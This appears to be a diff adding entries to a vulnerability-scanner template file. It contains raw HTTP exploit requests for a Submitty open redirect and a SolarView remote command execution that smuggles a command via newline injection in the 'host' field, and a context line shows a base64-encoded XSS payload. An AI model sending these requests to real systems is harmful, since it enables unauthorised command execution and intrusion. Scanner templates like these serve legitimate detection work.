@@ -11011,6 +11011,20 @@
       ]
     },
     {
+      "id": "CVE-2020-13121",
+      "info": {
+        "name": "Submitty 20.04.01 - Open redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /authentication/check_login?old=http%253A%252F%252Fexample.com%252Fhome HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{RootURL}}/authentication/login\n\nuser_id={{username}}&password={{password}}&stay_logged_in=on&login=Login\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-13158",
       "info": {
         "name": "Artica Proxy Community Edition <4.30.000000 - Local File Inclusion",
@@ -22888,6 +22902,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/onlinePreview?url=aHR0cHM6Ly93d3cuZ29vZ2xlLjxpbWcgc3JjPTEgb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPj1QUQ=="
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-40881",
+      "info": {
+        "name": "SolarView 6.00 - Remote Command Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /network_test.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nhost=%0a{{cmd}}%0a&command=ping\n"
           ]
         }
       ]
